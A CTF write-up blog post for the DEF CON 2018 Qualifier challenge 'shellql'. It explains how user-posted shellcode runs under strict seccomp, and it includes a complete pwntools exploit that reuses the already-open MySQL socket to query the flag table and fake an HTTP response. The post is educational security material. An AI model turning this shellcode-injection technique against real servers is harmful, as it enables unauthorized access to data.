---
layout: post
title: shellql - DEF CON CTF Qualifier 2018
date: '2018-05-21 20:30:00'
---

> Do you even SQL? The flag is in the table `flag`
>  http://b9d6d408.quals2018.oooverflow.io
> 
> Author : adamd
> [shellme.so](https://github.com/o-o-overflow/chall-shellql/blob/master/public_files/shellme.so)

*118 points, 64 Solves, web/shellcode*

After visiting the link we are redirected to `/cgi-bin/index.php` which is a simple php-cgi script that seems to just take our post data and call the shellme function:

```php
$link = mysqli_connect('localhost', 'shellql', 'shellql', 'shellql');
if (isset($_POST['shell']))
{
  if (strlen($_POST['shell']) <= 1000)
  {
    echo $_POST['shell'];
    shellme($_POST['shell']);
  }
  exit();
}
```

Disassembling `shellme.so` reveals that `shellme` invokes the `shell_this` function, which is the following: 

```c
void shell_this(char* shellcode) {
  int len = strlen(shellcode);
  void *ptr = mmap(0, len, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
  void (*shell)();

  memcpy(ptr, shellcode, len);
  alarm(30);

  prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);

  shell = (void (*)()) ptr;
  shell();

  return;
}
```

Snce seccomp has been setup in `SECCOMP_MODE_STRICT` mode, we only have read,write,exit and sigreturn. As the connection to mysql has already been opened, we can read and write straight the file descriptor to query the database. One gotcha is that we have to return a valid HTTP response otherwise apache will blow up with a 500 error.

A quick peak with wireshark to see what wire format of a mysql query reveals that has the query length (3 bytes), sequence id (1 byte), command (1 byte). Using a command of `3` for query we can build up what we need, using pwntools makes all writing the shellcode a breeze:

```python
#!/usr/bin/env python2
from pwn import *
import requests

context.arch = "amd64"
context.os = "linux"

host = "http://b9d6d408.quals2018.oooverflow.io/cgi-bin/"
html = """X-Powered-By: PHP/7.0.28-0ubuntu0.16.04.1\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<html><body>Hello World!</body></html>"""

query = "SELECT * from flag;"

shellcode = ""
shellcode += shellcraft.echo(p16(len(query)) + "\x00\x00\x03" + query , 4)
shellcode += shellcraft.read(4, 'rsp', 200)
shellcode += shellcraft.pushstr(html)
shellcode += shellcraft.write(1, 'rsp', 500)

data = {
  "shell": asm(shellcode) + "\x00"
}

resp = requests.post(host + "index.php", data=data)
print resp.text
```

Amoungst the random stack data returned is the flag:

`OOO{shellcode and webshell is old news, get with the times my friend!}`
